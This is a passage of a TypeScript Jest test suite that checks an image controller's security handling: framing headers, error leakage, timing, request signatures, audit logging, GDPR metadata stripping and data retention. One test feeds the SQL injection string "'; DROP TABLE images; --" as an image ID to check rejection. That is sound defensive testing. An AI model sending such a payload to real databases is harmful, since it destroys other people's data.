
      // In production, these headers should be set by middleware
      // but we can verify the controller doesn't override them
      expect(res.setHeader).not.toHaveBeenCalledWith('X-Powered-By', expect.anything());
    });

    it('should prevent clickjacking through proper framing', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      
      const mockImages = [createMockImage()];
      mockImageService.getUserImages.mockResolvedValue(mockImages);

      await imageController.getImages(req as Request, res as Response, next);

      // Should not set headers that allow framing from untrusted origins
      expect(res.setHeader).not.toHaveBeenCalledWith('X-Frame-Options', 'ALLOW-FROM *');
    });

    it('should sanitize error responses to prevent information leakage', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'image-456' };

      const verboseError = new Error('Database query failed: SELECT * FROM images WHERE id = "image-456" AND user_id = "user-123" failed at connection pool exhaustion');
      mockImageService.getImageById.mockRejectedValue(verboseError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(verboseError);
      // In production, error details should be logged but not exposed to client
    });
  });

  describe('Cryptographic Security', () => {
    it('should handle timing attacks on image ID validation', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };

      const validImageId = 'valid-image-id-123456789';
      const invalidImageId = 'x'; // Much shorter

      const timingTests = [
        { imageId: validImageId, shouldExist: true },
        { imageId: invalidImageId, shouldExist: false }
      ];

      for (const test of timingTests) {
        req.params = { id: test.imageId };
        
        if (test.shouldExist) {
          mockImageService.getImageById.mockResolvedValue(createMockImage());
        } else {
          mockImageService.getImageById.mockRejectedValue(new Error('Image not found'));
        }

        const startTime = Date.now();
        await imageController.getImage(req as Request, res as Response, next);
        const endTime = Date.now();

        // Response times should be consistent to prevent timing attacks
        expect(endTime - startTime).toBeLessThan(100);
      }
    });

    it('should validate cryptographic signatures if implemented', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.headers = {
        'x-signature': 'invalid-signature',
        'x-timestamp': Date.now().toString()
      };

      const signatureError = new Error('Invalid request signature');
      mockImageService.getUserImages.mockRejectedValue(signatureError);

      await imageController.getImages(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(signatureError);
    });
  });

  describe('Compliance and Audit Security', () => {
    it('should log security events for audit trails', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: "'; DROP TABLE images; --" }; // SQL injection attempt

      const sqlError = new Error('Invalid image ID format');
      mockImageService.getImageById.mockRejectedValue(sqlError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(sqlError);
      // In production, security events should be logged
      
      consoleSpy.mockRestore();
    });

    it('should handle GDPR compliance for user data', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.query = { includePersonalData: 'false' }; // GDPR-compliant request

      const sanitizedImages = [createMockImage({
        // Personal data should be excluded
        original_metadata: {
          width: 800,
          height: 600,
          format: 'jpeg'
          // GPS coordinates, camera model, etc. should be stripped
        }
      })];

      mockImageService.getUserImages.mockResolvedValue(sanitizedImages);

      await imageController.getImages(req as Request, res as Response, next);

      expect(mockSanitization.sanitizeImageForResponse).toHaveBeenCalled();
    });

    it('should enforce data retention policies', async () => {
      req.user = { id: 'user-123', email: 'test@example.com' };
      req.params = { id: 'old-image-456' };

      const retentionError = new Error('Image has exceeded retention policy and was automatically deleted');
      mockImageService.getImageById.mockRejectedValue(retentionError);

      await imageController.getImage(req as Request, res as Response, next);

      expect(next).toHaveBeenCalledWith(retentionError);
    });
  });
});